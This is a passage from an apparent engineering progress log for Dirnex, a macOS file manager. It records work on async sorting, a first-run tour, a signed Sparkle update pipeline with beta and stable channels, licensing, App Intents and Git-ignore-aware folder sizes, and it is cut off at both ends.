  filter on the main actor after the `await`. It also re-applies **any directory total that completed
  while the sort ran** (a Space-on-dir / size-viz result lands on the live model; the wholesale swap
  would drop it) — restricted to present entries, and cheap because `setDirectorySizes` now no-ops the
  re-sort under a name sort. Six call sites converted: **navigation** (`navigate` → `DirectoryLoader.
  model`, empty filter+sizes → the filter-clear step is now implicit and was deleted); **FSEvents
  refresh** (`directoryDidChange`); **column-header re-sort** (`tableView(_:didClick:)`, now an async
  `Task` guarded on `loadToken`); **tab-activation refresh**; **post-mutation refresh**
  (`refreshCurrentDirectory`, local + SFTP). Each snapshots `sort`/`showHidden`/`directorySizes` on the
  main actor *before* the `await` and guards `token == loadToken` (+ path) after. Left synchronous on
  purpose: `refreshArchiveDirectory` (virtual, bounded, size-viz-disabled) and the app-wide
  **show-hidden toggle** (`applyGlobalShowHidden` re-sorts *every* tab in a loop — an off-main, lazy,
  all-tabs rebuild is a separate change; a single-tab hidden toggle at 100k still costs one 350 ms
  main-actor sort, the one residual jank). 823 core + 79 app tests green, swiftformat + swiftlint
  `--strict` clean, release `PerformanceBudget` unregressed (steady filter 1.7 ms, cold 11 ms, 100k
  build 432 ms). **VERIFIED LIVE on a seeded 100k `many/` fixture** (both panes seeded via the
  `Dirnex.tabs.<side>` defaults blob, app launched from Terminal for stderr): the 100k dir opened
  instantly in correct natural order; the **Name header toggled to descending off-main** with the
  cursor kept on `entry-000000` by identity; a **"999" filter** narrowed to 280 rows preserving the
  descending order; **navigating up cleared the filter, kept the sort, and landed the cursor on the
  departed child**; re-entering reloaded 100k instantly; the right pane's **Size sort** ordered
  empty<tiny<kilobyte<megabyte off-main; and an **FSEvents refresh** (a 512 KB file dropped on disk via
  the shell) inserted the new row **in size order** while **keeping a marked `tiny.bin` marked and the
  cursor on `kilobyte.bin`** (footer "1 of 5 selected · 1 byte") — the off-main refresh's identity
  preservation proven end-to-end. Clean stderr, no crash/race. **NEXT in M7:** the first-run tour and
  the docs keyboard-reference (both buildable + live-verifiable, core-first); the remaining items
  stay blocked on the user (Sparkle/notarized-DMG CI creds).
  Optional perf follow-ups, neither blocking: move the show-hidden toggle's all-tabs re-sort
  off-main (lazy per-tab), and move the size-sorted-with-computed-totals streaming re-sort off-main
  (the one case `resortIfOrderDependsOnSize` still runs on the main actor).

Progress (2026-07-19, **M7 — First-run tour; the box closes `[x]`, VERIFIED LIVE**): the
palette-centric welcome the exit criterion needs a stranger to meet *before* the permission wall.
Core→app as always, and it slots in **ahead of** the shipped Full Disk Access onboarding rather than
beside it — the two now run as one sequence on a fresh install.
- **Core** (pure, tested): new `DirnexCore/Services/FirstRunTour.swift` — a `TourScreen` (id, SF
  symbol, title, body, and the highlighted **command ids**, not baked-in glyphs) and `FirstRunTour`
  with the ordered `screens` + a `maximumScreens = 5` ceiling. **THE data decision, the same
  `FunctionBar.defaultSlots` move: a screen names its actions by `CommandCatalog` id, so the app
  resolves each to the command's title and its *effective* shortcut through the user's `KeyBindings`
  — the tour prints exactly what the menu/⌘K palette print and can never advertise a key the app no
  longer honours.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
  commandPalette`) · file ops (`file.copy/move/newFolder/trash`) · navigation (`go.editLocation`,
  `file.newTab`, `go.favorites`) · You're-ready (`app.fullDiskAccess`). +7 tour tests pin length ≤ 5,
  well-formedness, unique ids, that **every highlighted id resolves to a real catalog command**, that
  the **palette is featured** (the load-bearing "palette-centric" claim), and that the tour opens on
  Welcome and closes on FDA. Plus a new `app.showTour` catalog command ("Welcome to Dirnex…",
  shortcut-free Application command, +1 catalog test). +8 → **831 core**.
- **App**: `Dirnex/Onboarding/FirstRunTourWindowController.swift` (a paged sheet over the browser
  window — SF-symbol illustration, headline, body, and a keyboard-reference list of the screen's
  commands as aligned **key-cap** rows resolved live from the registry; page dots + Back/Skip/Next,
  ⏎ = default advance, ⎋ = leave; **fixed-width right-aligned key-cap column so a shortcut-less row
  like Full Disk Access keeps its title aligned**) + `FirstRunTourPresenter.swift` (the
  `FullDiskAccessOnboarding` twin: a `hasSeenFirstRunTour` one-shot latch in `AppPreferences`, the
  `XCTestConfigurationFilePath` guard so it never fires mid-suite, and the **sequencing** — launch
  path shows the tour once then chains `FullDiskAccessOnboarding.presentIfNeeded`; on-demand path
  ("Welcome to Dirnex…" app-menu item + palette) always shows it and hands off to nothing). **THE
  sequencing decision: the last screen's primary button is parameterised, not hard-coded — the launch
  flow leaves "Get Started" (→ FDA hand-off), the on-demand flow sets "Open Command Palette" (→ opens
  ⌘K), so the palette-centric payoff never collides with the FDA sheet the first run needs.**
  `AppDelegate` now calls `FirstRunTourPresenter.presentIfNeeded` (was `FullDiskAccessOnboarding`
  directly); `showFirstRunTour(_:)` selector + `app.showTour` in `CommandBinding` + the menu item
  after Full Disk Access. +4 app tests (show-tour is wired; every highlighted command is
  real+dispatchable; the palette screen resolves to "⌘K"; the controller builds a window) → **83
  app**. 831 core + 83 app green, swiftformat + swiftlint `--strict` clean.
- **VERIFIED LIVE** (fresh Debug build, both latches reset, launched clean after killing the stale
  pre-rebuild instance — the recurring `open`-reactivates-the-old-binary trap): first launch popped
  the tour as a sheet on Welcome (no chip, no Back); paging showed the resolved **⌘K** cap on the
  palette screen, the **F5/F6/F7/F8** file-op rows aligned to the function bar below, the
  **⌘L/⌘T/⌃D** navigation rows, and the shortcut-less **Full Disk Access…** row with its title still
  column-aligned; **Get Started closed the tour and the FDA prompt appeared** (the hand-off);
  **Not Now** dismissed it; **App-menu ▸ Welcome to Dirnex…** reopened the tour, whose last screen now
  read **Open Command Palette** and, clicked, closed the tour and opened ⌘K with **no** FDA prompt;
  and a palette search for "welcome" found the command. **NEXT in M7:** the remaining items all stay
  blocked on the user (Sparkle/notarized-DMG CI creds).

Progress (2026-07-19, **M7 — Sparkle 2 auto-update + notarized-DMG release pipeline SHIPPED + VERIFIED
LIVE; the box is `[x]`**): built the whole pipeline, then cut a real release — **v0.0.3 published a
signed/notarized/stapled DMG + Sparkle appcast from GitHub Actions**, closing the box. Reused the
sibling `system-utilities-macos` app's proven pipeline. **Probed the
reference first** (the M4/M5/M6 opener): it is a pure-SwiftPM app that hand-assembles its bundle from
`swift build`, so its `make_dmg`/`notarize_dmg`/`make_appcast` scripts + the CI cert-install/notarize
steps port almost verbatim, but its `build_app.sh` does **not** — Dirnex is an Xcode project with
SwiftTerm (and now Sparkle) as embedded frameworks/XPC services, and only `xcodebuild archive` +
`-exportArchive` sign that nested code correctly. **App wiring (the registry is the single source of
truth, so the updater is a real command, not a hardcoded menu target):** new `Dirnex/AppUpdater.swift`
(AppKit-only wrapper over `SPUStandardUpdaterController`, built lazily and skipped under
`XCTestConfigurationFilePath` — same test-host guard FDA/tour use — but **never `#if`-d out, so the
Debug `xcodebuild test` job still compiles the Sparkle path**); `app.checkForUpdates` added to
`CommandCatalog` (Application category) + `CommandBinding` → `AppDelegate.checkForUpdates(_:)` +
`MainMenuBuilder` places it under About; `Dirnex/Info.plist` gains committed `SUFeedURL`
(`…/releases/latest/download/appcast.xml`) + `SUPublicEDKey` (public, reused from
system-utilities-macos — one Sparkle key across both apps). **Sparkle added to the Xcode project the
same way SwiftTerm is** — six mirrored `project.pbxproj` entries (remote ref `…301`, product dep
`…302`, build file `…303`), pinned `exactVersion 2.9.4`; `Package.resolved` regenerated. **Release
infra:** `VERSION`, `Packaging/ExportOptions.plist` (Developer ID / manual / team A9N92VGA2M — the
hardened runtime is already on, so the export re-sign just preserves it + adds a timestamp),
`scripts/build_app.sh` (archive+export), `scripts/{make_dmg,notarize_dmg,make_appcast}.sh` (the
appcast script's only real change vs the reference: `sign_update` now ships in the SwiftPM artifact
bundle, so it's found under the release derived-data tree, not `.build/`), `.github/workflows/
release.yml` (tag `v*` or manual dispatch; Metal-toolchain download for SwiftTerm; core-test gate;
cert install; build→DMG→notarize→appcast→GitHub release), `docs/RELEASING.md`, and `.gitignore`
tweaks (`dist/`, un-ignore the one committed `ExportOptions.plist`). **VERIFIED as far as is possible
without the secrets:** `xcodebuild -resolvePackageDependencies` checked out Sparkle 2.9.4; a Debug app
build **BUILD SUCCEEDED** (Sparkle + `AppUpdater` compile and link); the app suite **TEST SUCCEEDED,
83 tests** (the test-host guard held — no live updater, no prompt, no hang); core `CommandCatalog`
tests green; swiftformat + swiftlint --strict clean. **Then the live release:** the six repo secrets
had to be **re-created, not copied** — GitHub secrets are write-only, so the sibling repo's values
can't be read back; each was re-derived from source (`.p12` base64'd to clipboard, `TEAM_ID` =
`A9N92VGA2M`, a fresh app-specific password, the Sparkle private key exported from the login keychain
with `generate_keys -x`, a new App-Specific password). One first-run failure — `security import` hit
"passphrase not correct", i.e. a wrong `DEVELOPER_ID_CERTIFICATE_PASSWORD` (the `.p12` had decoded
fine, so the cert secret was good); recoverable by testing the `.p12` password locally or re-exporting
the cert with a known one. After the fix, **v0.0.3 shipped clean**. Known: committed feed/key means
**Debug/dev launches also check the feed** (dogfood-friendly; gate on `#if !DEBUG` later if it grates).
**NEXT in M7:** the beta/stable channels below (**now DONE — see the 2026-07-19 "channels — DONE"
note**).

Design deferred (2026-07-19, **M7 — beta + stable update channels; box `[ ]`, implement later**): the
user wants two release tracks — a "complete" (stable) release and an opt-in beta — served by the one
pipeline. **Approach: Sparkle 2 channels, single appcast** (chosen over separate feeds because it
handles beta→stable graduation for free: when a stable version outranks a running beta, the beta
tester rolls onto stable automatically; separate feeds strand them). Beta items carry
`<sparkle:channel>beta</sparkle:channel>`, stable items are untagged; untagged is the default channel
everyone sees. **Three parts to build when we pick this up:** (1) **App opt-in** — a new
`AppPreferences.receiveBetaUpdates` (default off) + `AppUpdater` becomes the `updaterDelegate` and
implements `SPUUpdaterDelegate.allowedChannels(for:) -> Set<String>` returning `["beta"]` when the
pref is on, `[]` otherwise (read each check, so a Settings toggle takes effect without relaunch);
core-first + a Settings toggle. (2) **Release trigger** — a tag convention: `vX.Y.Z` = stable
(`--latest`), `vX.Y.Z-beta.N` = beta (GitHub `--prerelease`); `release.yml` derives the channel from
the `-` suffix, no new inputs. (3) **Persistent two-channel appcast** — today `make_appcast.sh` writes
a fresh **one-item** appcast to each release and the feed reads `releases/latest/…`, which structurally
can't carry two channels. Fix: host the appcast at ONE stable location (recommended: a fixed `appcast`
GitHub release whose sole asset is `appcast.xml`, created `--latest=false` — reuses the existing
`gh release upload` path, no new infra; GitHub Pages is the conventional alternative) and, on each
release, **merge** — fetch the current appcast, replace the item for *this* channel, keep the other —
so it always holds exactly two items (latest stable + latest beta). `SUFeedURL` moves to that stable
location (free now — no external users on the old `latest/…` feed yet). **Gotcha to preserve:** Sparkle
ranks by `CFBundleVersion`, which must stay **globally monotonic across both channels** or an old beta
could outrank a new stable — already satisfied because build numbers are the GitHub run number.

Progress (2026-07-19, **M7 — beta + stable update channels; box `[x]`, VERIFIED LIVE**): shipped the
three parts of the design above, built the deferred design exactly. **834 core (+3) + 85 app (+2);
lint + format clean.**

(1) **Core** `DirnexCore/Services/UpdateChannels.swift` (a caseless-enum namespace, `FunctionBar`
shape): `UpdateChannels.beta = "beta"` (the single source of truth for the channel literal, shared
with the pipeline's tag) + `allowed(receiveBetaUpdates:) -> Set<String>` = `["beta"]` on, `[]` off
(Sparkle reads `[]` as "default channel only"). Kept `classify(version:)` OUT deliberately — the
tag→channel rule lives only in `release.yml` shell where the tag actually is, so no prod-dead Swift
for periphery to flag. +3 tests.

(2) **App opt-in** — `AppPreferences.receiveBetaUpdates` (default off, Settings-only like
`restoreSession`, no toggle helper) + a **`nonisolated static receiveBetaUpdatesValue(in:)`** that
reads the key straight from `UserDefaults`. `AppUpdater` became `NSObject, SPUUpdaterDelegate`
(delegate protocol refines `NSObject`); `updaterController` went `let`→`var` because two-phase init
forbids passing `self` before `super.init()` (Optional auto-nils, assign once after). The hook is
`nonisolated func allowedChannels(for _: SPUUpdater)` calling the off-main reader — **NOT
`MainActor.assumeIsolated`**, on purpose: Sparkle calls it synchronously inside a check and a
thread-safe `UserDefaults` read is provably safe regardless of Sparkle's threading, re-read each
check so a Settings flip needs no relaunch. Settings General gained a "Receive beta updates" toggle.
**THE app-test guard (the one thing a compile can't rule out): `#expect(updater.responds(to:
#selector(AppUpdater.allowedChannels(for:))))`** — `#selector` only *compiles* because Swift exposed
the witness under Sparkle's exact `allowedChannelsForUpdater:` selector (a signature mismatch drops
the `@objc` and fails the build), and `responds(to:)` proves it's live; without this a wrong selector
would compile yet silently never be consulted. The Swift-name→ObjC-selector mapping was independently
confirmed by the compiler's own fixit (it offered `#selector(AppUpdater.allowedChannels(for:))` as the
replacement for the literal `"allowedChannelsForUpdater:"`). +2 app tests. **LIVE-verified in the
shipping binary:** the Settings toggle renders on General with its footer, defaults off, and
round-trips to the real `com.dirnex.Dirnex` domain (`Dirnex.pref.receiveBetaUpdates` → `1` on / `0`
off) — so the delegate's reader returns `["beta"]`/`[]` accordingly.

(3) **Two-channel appcast pipeline** — `make_appcast.sh` gained `CHANNEL` (stable|beta) + an optional
`EXISTING_APPCAST`: it emits the current build's item (beta gets the `<sparkle:channel>beta>` tag,
stable is untagged) and **merges** — an `awk` classifies each `<item>` block of the existing feed as
beta iff it carries a `<sparkle:channel>` tag and keeps only the OTHER channel, so the feed always
holds exactly the latest stable + latest beta. **PROVEN LIVE with a stubbed `sign_update` across
every transition:** first-stable (1 item), first-beta-over-stable (2), new-stable-keeps-beta,
new-beta-keeps-stable, beta-only-feed-then-stable, and a missing/empty existing file (→ fresh
1-item); output is `xmllint`-well-formed and preserves each kept item's own signed enclosure URL.
`release.yml`: derives `CHANNEL` from the tag's `-` suffix (no new inputs; **beta versions are NOT
written back to `VERSION`** so the numeric auto-bump can't break), fetches the current appcast from a
fixed **`appcast` GitHub release** (created `--latest=false`, its sole asset is `appcast.xml`),
publishes the **DMG to the per-tag release** (stable `--latest`, beta `--prerelease`, so GitHub's
"Latest" always points at stable), and re-uploads the merged appcast to the `appcast` release
(`--clobber`, drafts skip the live feed). **`SUFeedURL` moved** from `releases/latest/download/…` to
`releases/download/appcast/appcast.xml` (the stable feed URL). **Migration gotcha (documented in
RELEASING.md): builds ≤ v0.0.3 still poll the old `latest/…` URL, so the first channelled release
must be installed manually once** — the design accepted this ("no external users on the old feed
yet").

Follow-up (2026-07-19, same day — **a dedicated Beta workflow**, user-requested): cutting a beta by
hand-inventing `vX.Y.Z-beta.N` was the remaining friction, so `.github/workflows/beta.yml` now gives
betas their own *Run workflow* button. It is a **thin caller, not a second pipeline**: a cheap
`ubuntu-latest` job picks the version (base = `VERSION`+1 patch, overridable via a `base_version`
input; `.N` = highest existing `v<base>-beta.*` tag + 1, `sort -n` so `beta.10` → `beta.11`), then
`uses: ./.github/workflows/release.yml` with `secrets: inherit` — so `release.yml` gained a
`workflow_call` trigger and remains the single home of the signing/notarizing/appcast logic. The tag
itself is still created by the existing `gh release create --target` (no PAT needed; a
`GITHUB_TOKEN`-pushed tag would NOT re-trigger a workflow, which is exactly why the reusable-workflow
route beats "push a tag and let `on: push` fire").

**THE trap this surfaced, and the reason the build-number rule CHANGED:** `github.run_number` is
**per-workflow-FILE**, and under `workflow_call` the `github` context is the *caller's* — so a beta
run through `beta.yml` would draw from a fresh counter starting at **1**, while stable runs sat at
~5. That silently breaks the monotonic-`CFBundleVersion` invariant this whole design rests on, and
it fails in the quiet direction: a beta stamped *below* the installed stable is simply never offered,
so the beta channel would look empty rather than broken. Fix: a new **"Resolve the build number"**
step floors every build at `max(run_number, highest <sparkle:version> in the published feed + 1)` —
the feed is the one number line every release shares regardless of which workflow started it, and
because the appcast always holds the highest build of *each* channel, its max is the highest ever
published. Verified locally: the trap case (run_number 1 vs a feed at 10) raises to 11, a run_number
already ahead is left alone (so the existing stable flow doesn't regress), and an absent feed falls
back to the run number for the very first release. Two supporting changes: the appcast fetch moved
**before** the build (it now decides the build number) and lost its draft gate — only *publishing*
is draft-gated now, so a draft still produces a correct merged artifact to inspect; and both the
resolve step and the VERSION-file gate switched from `github.event_name` to **`github.ref_type`**,
because under `workflow_call` the event name is the caller's and would read `workflow_dispatch` no
matter what actually triggered the run.

Progress (2026-07-19, **M7 — titlebar update indicator, VERIFIED LIVE**): closed the ambient gap the
Sparkle work left behind. Until now the *only* signal that a new version existed was Sparkle's own
dialog, and it is a one-shot — dismiss it and the update is invisible until the next scheduled check
hours later; the `app.checkForUpdates` command (App menu + ⌘K) is the only way back to it, and it
tells you nothing until you run it. Now an accented ⬇ glyph appears in the **leading** titlebar
accessory, immediately right of the sidebar toggle (traffic lights · sidebar · ⬇), whenever an update
is waiting — tooltipped with the version, and clicking it re-enters the same `app.checkForUpdates`
path through the responder chain rather than a private one. Hidden — not disabled — at rest: an
always-visible badge trains the eye to ignore it, which is the one thing an update indicator must not
do. (Built first into the trailing cluster; **the user moved it beside the sidebar toggle** — it reads
as app-level status there, next to the window's other app-level control, rather than as a fourth
navigation glyph. The leading row is pinned at its *leading* edge, so the sidebar button holds its
spot beside the traffic lights and the badge extends rightwards into empty title bar.)

Split the usual way. Core owns the part that can be *wrong*: `UpdateAvailability` (+ `UpdateChoice`,
a Sparkle-free stand-in for `SPUUserUpdateChoice`) is a value type whose transitions are the policy —
**dismiss keeps the badge** (the user postponed; that is precisely what the ambient signal is for),
while **skip and install clear it** (Sparkle will not raise a skipped version again on its own, and
an install is about to relaunch into it). 11 tests pin that, plus the blank/whitespace version
normalisation that keeps the tooltip from reading "Dirnex  is available". The app half is adapter
only: `AppUpdater` gained `didFindValidUpdate` / `updaterDidNotFindUpdate` /
`userDidMake:forUpdate:state:`, each a one-line assignment into an `availability` property whose
`didSet` posts `AppUpdater.availabilityDidChange`; `BrowserWindowController+Updates` mirrors it.
Two wiring notes worth keeping: the delegate witnesses must be `nonisolated` under Swift 6, so they
funnel through a `Thread.isMainThread ? assumeIsolated : Task` hop — `SPUUpdater` is documented
main-thread-only, so the fast path is the real one and the `Task` is just insurance against trapping
in a shipping build; and Swift imports the choice callback as `updater(_:userDidMake:forUpdate:state:)`,
*not* `userDidMakeChoice:` (which fails to compile — a rename, but the app test asserts the
Objective-C selector `updater:userDidMakeChoice:forUpdate:state:` by name anyway, since Sparkle
dispatches by selector and a Swift signature that drifts stops being the witness *silently*).

**The bug the live check caught, which no test would have:** a titlebar accessory clips to its
container's fixed frame, and the trailing cluster's 84pt was exactly three glyphs wide
(`n·16 + (n−1)·12 + 12`). A fourth button is laid out but **clipped off the leading edge** — state
correct, `isHidden` false, nothing on screen. Both accessory containers now derive their width from
what they actually hold (the trailing one as `n·(16+12)`, which reproduces 84 for three), and the
same trap is called out in the leading accessory's comment, since it sizes for a button that is
usually hidden. Verified in the running app with a temporary seeded
availability: the badge renders at even spacing, and clicking it ran a real check
whose "You're up to date!" answer drove `updaterDidNotFindUpdate` → the badge removed itself and the
row collapsed with no gap — the found *and* cleared halves both proven live, then the seed reverted.
Housekeeping: `installEscapeMonitor` moved to `BrowserWindowController+QuickView` (the Quick View
machinery it exists for) to keep the window controller under the 500-line lint ceiling.
845 core + 87 app tests green; swiftformat + swiftlint --strict clean.

Progress (2026-07-19, **M7 — licensing; the box closes `[x]`**): the goal was "fork freely, but not
under our name or our icon", which is two different bodies of law and needs two different
instruments.

**Apache 2.0, not MIT.** Both permit forking; only Apache has §6, an *explicit* refusal to grant
trademark rights, plus a patent grant with a retaliation clause. Under MIT the name question is
merely unaddressed — the reader has to know trademark law applies independently. Apache states it in
the license the forker is already reading. `LICENSE` is the canonical text **verbatim** (sha256
`cfc7749b…`, only the appendix copyright line filled in) so GitHub's licence detector recognises it
and nobody has to diff it against upstream to trust it.

**The icon needs a separate carve-out, because §6 does not reach it.** §6 is about *trademarks* — it
stops a forker calling their build "Dirnex". But the icon PNGs are **copyrighted artwork sitting in
the repo**, and Apache 2.0 licenses "the Work", which by default is everything in it. Section 6
would not have stopped a fork from shipping our icon; the Apache grant would have *permitted* it. So
the exclusion is stated explicitly, naming the path
`Dirnex/Assets.xcassets/AppIcon.appiconset/`.

**That exclusion lives in `NOTICE`, and that placement is the point.** §4(d) obliges every
redistributor to carry the `NOTICE` text along — it is the one file in an Apache project that
*propagates by license terms* into derivative works. A carve-out stated only in the README travels
exactly as far as the README, which a forker rewrites first thing. `TRADEMARKS.md` then carries the
long form: what is allowed without asking (nominative fair use — "a fork of Dirnex", "based on
Dirnex"), what is not, and a **table of everything to change before shipping a fork** (icon set,
`CFBundleName`/`CFBundleIdentifier`, scheme/product name, user-visible strings, and the Sparkle
appcast URL). The appcast row is the one with teeth: a fork left pointing at our feed would push
official Dirnex builds onto its own users, so it is called out as never permitted rather than left
to inference. `NOTICE` also carries Sparkle's MIT attribution, which the shipped binary owes anyway.

The open question in §7 — "name/brand check for Dirnex before 1.0" — is a *search* for prior marks,
not a licensing task, and stays open. → **Closed 2026-07-19: the user cleared the name, it is free.**

Progress (2026-07-19, **M6 leftover — App Intents / Shortcuts surface; VERIFIED LIVE**): the half of
"Automation: AppleScript/Shortcuts verbs" that M6 shipped only one side of. The `.sdef` gave
AppleScript `reveal` / `copy selection` / `run operation`; this is the same three verbs as **App
Intents**, which is what actually puts Dirnex in Shortcuts.app, Spotlight, and the Shortcuts menu bar.
No extension target — intents compile into the app bundle.

**The design question was the picker, and it inverted the core API.** AppleScript asks "what does
this *typed string* mean", which `AutomationOperation.resolve` already answered. Shortcuts asks the
opposite: it renders a **list**, so it needs the operations up front. So `AutomationOperation` gained
three list-shaped entry points beside `resolve` — `all`, `search`, `operations(ids:)` — and they
returned `Command`, not a new struct, because a user script *already* becomes a `Command` via
`UserScript.paletteCommand` and `CommandMatcher` *already* fuzzy-ranks `[Command]` for ⌘K. The whole
core addition is 40 lines of glue over parts that existed; +9 tests.

Two rules are deliberately **different from `resolve`**, and both are pinned by tests. `search` is
*fuzzier* — a picker is a search box, so "cop" must surface Copy the way the palette does.
`operations(ids:)` is *stricter*: **exact ids only**. A saved Shortcut stores the id it was built
with, so that call is identity, not search; if a user renames the script a Shortcut points at, the id
must stop resolving (Shortcuts then shows the action as needing a value) rather than fall back to
fuzzy matching and silently bind to *some other* operation. A shortcut that visibly breaks beats one
that quietly runs the wrong command.

App side: `DirnexOperation: AppEntity` + a `DirnexOperationQuery` conforming to **both**
`EnumerableEntityQuery` (what makes the parameter a browsable dropdown — the thing the AppleScript
verb can never be, since it requires already knowing a command's name) and `EntityStringQuery` (the
search field on top). Every query call re-reads `UserScriptStore` rather than caching, because a user
can add a script while the Shortcuts editor is open. Three `AppIntent`s with `@MainActor perform()`
(an async intent may be main-isolated directly, so these read straight through where the Apple-event
handlers next door need `MainActor.assumeIsolated`), all `openAppWhenRun` since every verb acts on a
visible panel. `Reveal` takes an `IntentFile` rather than a path string, so it chains off Finder's
"Get Selected Files" — Dirnex is unsandboxed, so a file passed by reference keeps its real URL.
`Scripting.activeWindow` moved out of `ScriptingCommands.swift` into `ScriptingTarget.swift`, shared
by both surfaces so "which window does automation hit" has one answer; the AppleScript-only error
numbers stayed behind as `AppleScriptError`. Only the zero-parameter verb is an `AppShortcut`
(Spotlight needs to run it with no input); the other two are Shortcuts actions.

**The trap, and it is a big one: an ad-hoc-signed build can never register App Intents.** The code
was correct and the metadata extracted from the first build, but Shortcuts showed nothing — because
`linkd` logs `Unable to get teamId from com.dirnex.Dirnex` and drops the connection. A local Debug
build is ad-hoc signed (M0's decision), so `TeamIdentifier=not set` and registration is refused
outright. Re-signing the DerivedData bundle with the Developer ID identity fixed the teamId error —
and then *still* showed nothing, because **`linkd` only indexes apps in standard install locations**;
it never opened an indexing transaction for a bundle under DerivedData. Only after installing the
signed build to `/Applications` did the log read `Registering "com.dirnex.Dirnex" in the metadata
store` → `Interpolating AppShortcuts` and the app appear in the Shortcuts action library. Two
consequences worth keeping: **this works automatically in release builds** (the notarized Developer
ID DMG pipeline satisfies both conditions), and **verifying it locally requires a signed copy in
/Applications** — no amount of rebuilding in place will do. The same refusal is why `xcodebuild test`
now prints `connection to service named com.apple.linkd.autoShortcut` noise: the ad-hoc test host is
being turned away. Harmless, and the tests read the emitted metadata off disk instead of asking the
daemon.

Verified live end to end, in Shortcuts against a `/Applications` copy of the signed build: Dirnex
appears in the Apps list; its four actions are there (the three written ones plus a **"Find Dirnex
Operation"** Shortcuts generates for free out of the enumerable query); "Run Dirnex Operation" renders
as the `ParameterSummary` sentence "Run *Operation* in Dirnex"; the Operation picker populates from
the live registry in registry order with the category as each row's subtitle; and running it with
"New Tab" selected brought Dirnex forward and opened a second tab — proving the whole chain, Shortcuts
→ intent → entity id → the same `runCommand(id:)` the palette and F-key bar use. The user's installed
notarized v0.0.4 was backed up first and restored afterwards (Gatekeeper: accepted, Notarized
Developer ID). 854 core (+9) + 94 app (+7) tests green; swiftformat + swiftlint --strict clean.

### .gitignore-aware folder sizes (2026-07-19, VERIFIED LIVE — the last M6 leftover, now closed)

The one optional slice deferred since M6 pass 1. **Probed first**, and the probe decided the design:
`GitCommand.status` already passes `--ignored=traditional`, and a real repository shows it reports
every ignored *directory* collapsed to one row — including `untracked/build/`, an ignored directory
nested inside an untracked one. So the ignore data was **already in hand**: no second `git` run, no
`check-ignore`, no `ls-files`. It also shows `.git` appears in no status output at all, and that a
nested repository is a single `?? nested/` whose own rules the outer status cannot see.

Semantics chosen: **"what Git would care about"** — ignored paths and `.git` pruned. The rejected
alternative was showing ignored bytes as a second bar segment, which reads better but forfeits the
whole performance win: an excluded directory is never *walked*, and walk cost tracks entry count, so
skipping `node_modules` is most of what makes the mode cheap enough to leave on. The rows left out are
exactly the rows the status column already paints `!`, so a shrunken number has an on-screen
explanation — the same coherence argument that made `SizeBar` measure logical bytes.

Core (all tested): `DirectorySizer.size(excluding:)` prunes a subtree instead of walking and
discarding it; `GitStatusSnapshot.isExcludedFromSize` is the predicate, resting on two properties of
`GitFileStatus` that tests now pin — `.ignored` does **not** roll up (one `debug.log` must not delete
`src` from the chart) but **is** inherited (everything inside a collapsed `build/` goes with it);
`GitStatusSnapshot.ignoredPaths` isolates "did the rules change?" from "did anything change?";
`DirectorySizeCache` is keyed by `(path, DirectorySizeScope)` — **the bug that would otherwise have
shipped**, since one folder has two legitimate totals differing 500x in a source tree and a
path-keyed cache serves the wrong one instantly and silently; `DirectoryModel/Panel.clearDirectorySizes`
for the toggle, because a total from the other scope is not stale but wrong.

App: `DirectorySizeRule` (`.everything` / `.gitAware(snapshot)`) makes "filtered sizing with no idea
what is ignored" unrepresentable, and rides through the provider's queue, which is now scope-keyed
end to end (`queue`, `order`, `inFlight`). Space-on-dir obeys the same rule, so one size column never
mixes two kinds of number. Per-tab toggle (View ▸ Exclude Git-Ignored from Sizes, palette, no
shortcut), greyed outside a repository, with the status line saying **"sizes exclude Git-ignored"**
whenever it is in force. `DirectorySizeProvider` watches `GitStatusProvider`'s notification and
invalidates git-aware totals **only when `ignoredPaths` moved** — that provider republishes on every
debounced read, so hanging invalidation on it would re-walk the tree on every ⌘S.

**Two traps this pass paid for, both found only by running the thing:**

1. **`DirectorySizer.size` now takes two closures, and a bare trailing closure binds to `excluding`,
   not `isCancelled`.** That silently reverses what every pre-existing call meant; it failed loudly
   here only because the two have different arities. Every call site is labelled now, and the doc
   comment says why.
2. **A landed total could be erased between its walk and its publish.** The publish used to say
   "something changed, go re-read the cache" — but any pane's FSEvents watcher invalidates every
   total on its root-to-leaf line, and the other pane sitting on `~` produced (measured live)
   **546 invalidations in two minutes, ~one every 150 ms**, faster than a scan can publish. Five of
   nine freshly walked folders were wiped that way and *nothing ever re-delivered them* — the rows
   stayed blank forever. This was pre-existing churn made visible only by `clearDirectorySizes`
   removing the safety net of stale-but-present numbers. Fixed by carrying the totals **in** the
   notification (`totalsKey`/`scopeKey`), so a computed number cannot be lost in transit; the cache
   went back to being a pure latency optimization.

**A third trap, caught by the user reading the screenshot rather than by any test — and the fix went
two rounds.** An ignored folder was first rendered as its filtered total, which for a wholly-ignored
`build/` is **"Zero KB · 0.0 %"**. That is a lie of the most ordinary kind: it reads as *"measured,
and this folder is empty"* — a claim about the folder, when the truth is a claim about the question
("nothing here counts toward what you asked to see"). **An excluded row is now omitted from the
projection entirely** (`SizeVisualization.init(model:isExcluded:)`): no bar, no contribution to either
denominator, and — the part that makes it stable rather than a flicker — **kept out of
`pendingDirectories`**, since a row with no total is otherwise pending forever and the pane would
re-queue a walk for it on every render. Space-on-dir refuses it for the same reason. The row falls
back to the `—` and blank bar an unwalked directory shows, which is exactly right: in both cases the
honest answer is *we are not telling you a number here*, and the `!` in the Git column plus the status
line carry the reason. No third rendering had to be invented.

Round one had tuned the *empty bar's* contrast instead, which was the wrong layer but exposed a
genuine pre-existing bug worth keeping: on the **cursor row** an empty bar read as a *full* one.
`SizeBarView` draws no ink at zero bytes (the core's rule, working correctly) but still draws the
empty track — and on the emphasized row track and ink are both `alternateSelectedControlTextColor`,
separated by alpha alone, with the track owning the column's whole width where the ink may own a
point. At 0.25 that inverted the reading: an empty track looked like the heaviest row in the folder.
Track alpha is now **0.12**, verified live against a partially-filled emphasized row (solid white ink
to 31 %, the remainder clearly recessed). Still worth having independently of the omission fix above,
because a *genuinely* empty folder does draw an empty track by design ("an empty folder is not
negligible, it is empty" — `SizeBar.inkWidth`), and any of those under the cursor hit the same
inversion.

Live verification against this repository: `DirnexCore` 587.3 MB → **1,097,930 bytes**, matching
`git ls-files` + untracked-not-ignored summed by hand *exactly*; `build/` (wholly ignored) reads
Zero KB rather than 1.63 GB; toggling off restores every unfiltered total. In a scratch repository,
appending `artifacts/` to `.gitignore` flipped that folder from `?` 5.3 MB / 50.1 % to `!` Zero KB
with the bars re-scaling — the rules-change path, with no byte moving on disk. 871 core (+17) + 94 app
tests green, swiftformat + swiftlint --strict clean (`PanelViewController+FileOps` crossed its length
